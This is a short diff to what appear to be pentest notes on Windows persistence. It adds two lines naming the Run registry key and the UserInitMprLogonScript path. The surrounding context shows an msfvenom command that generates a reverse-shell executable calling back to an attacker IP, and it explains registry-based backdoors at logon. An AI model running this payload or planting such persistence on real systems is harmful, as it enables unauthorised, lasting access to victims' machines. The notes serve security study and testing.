@@ -12,6 +12,9 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$attack_ip LPORT=$port -f exe -o
 ```
 Transfer to target machine and copy to one of the above locations.
 
+Registry key:
+`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
+
 ## Run / RunOnce
 Instead of a directory you can modify the registery entries to specify application to run at logon:
 -   `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
@@ -34,6 +37,8 @@ WinLogon loads user profiles after authenication, it uses registry keys under:
 `userinit.exe` while loading a user profile checks the environment variable called `UserInitMprLogonScript`. It is `HKCU` defined and must configured for each user that you require to have backdoor to. 
 - `HKCU\Environment` - Parent key to make the subkey under:
 	- `UserInitMprLogonScript`; `REG_EXPAND_SZ`; `Path to backdoor`
+
+`HKCU\Environment\UserInitMprLogonScript` for full registry path
 
 ## References
 
